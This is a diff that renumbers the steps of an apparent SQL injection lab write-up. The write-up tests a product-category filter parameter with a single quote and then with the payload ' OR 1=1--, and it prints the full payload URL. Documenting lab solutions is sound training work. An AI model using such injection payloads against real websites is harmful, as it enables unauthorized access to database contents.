@@ -8,10 +8,10 @@
 
 ## Steps:
 1. Search for endpoints that uses sql query
-1. Found `category` parameter in `/filter?category=Corporate+gifts`
-2. Tested with `'` → 500 error (confirmed injectable)
-3. Added `' OR 1=1--` → All products revealed
-4. Lab solved
+2. Found `category` parameter in `/filter?category=Corporate+gifts`
+3. Tested with `'` → 500 error (confirmed injectable)
+4. Added `' OR 1=1--` → All products revealed
+5. Lab solved
 
 ## Payload:
 /filter?category=Corporate+gifts'+OR+1=1--
